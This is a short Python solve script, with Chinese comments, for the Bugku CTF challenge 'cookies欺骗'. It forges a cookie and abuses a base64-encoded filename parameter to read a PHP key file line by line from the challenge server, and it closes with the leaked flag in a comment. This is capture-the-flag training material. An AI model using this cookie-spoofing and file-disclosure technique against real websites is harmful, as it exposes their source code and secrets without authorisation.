'''
  利用requests添加cookies
  理论：https://2.python-requests.org/en/master/user/quickstart/#cookies
  题目：bugkuctf cookies欺骗
'''
import requests
flag = 20
cookies = {"margin": "margin"}
for i in range(flag):
    url = "http://123.206.87.240:8002/web11/index.php?line=" + \
        str(i)+"&filename=a2V5cy5waHA="
    s = requests.get(url, cookies=cookies)
    print(s.text)

# <?php $key='KEY{key_keys}'; ?>
